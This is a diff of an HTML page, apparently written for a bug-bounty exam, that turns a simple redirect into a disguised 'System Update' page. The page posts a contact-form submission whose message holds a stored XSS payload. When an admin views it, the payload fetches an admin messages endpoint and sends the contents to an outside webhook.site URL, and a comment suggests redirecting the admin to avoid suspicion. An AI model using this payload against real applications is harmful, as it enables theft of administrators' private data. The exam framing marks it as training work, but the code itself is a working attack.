@@ -1,9 +1,35 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>System Update</title>
+</head>
 <body>
+    <h1>Processing Request...</h1>
     <script>
-        // Use the ID you just copied from your Sent folder
-        window.location.replace('https://bugbounty-exam.hashacademy.co/dashboard/messages/69eaa567bee6d6b7c6646710');
+        // The target endpoint where the contact form submits
+        const targetUrl = "https://TARGET-APP-URL.com/api/contact"; 
+
+        const payload = {
+            "name": "Saja",
+            "email": "research@seoulaura.com",
+            "subject": "Urgent: System Vulnerability Report",
+            "message": "<img src=x onerror=\"fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43').then(r=>r.text()).then(t=>fetch('https://webhook.site/f0c27699-6e26-4893-b47f-8e1c45b045ae',{method:'POST',mode:'no-cors',body:btoa('EXAM_FLAG:'+t)}))\">",
+            "category": "technical",
+            "priority": "high"
+        };
+
+        fetch(targetUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload),
+            mode: 'no-cors' // Use no-cors if the API doesn't have permissive CORS headers
+        }).then(() => {
+            console.log("Payload delivered. Redirecting...");
+            // Optional: Redirect admin to a real page to avoid suspicion
+            // window.location = "https://TARGET-APP-URL.com/dashboard";
+        });
     </script>
 </body>
 </html>
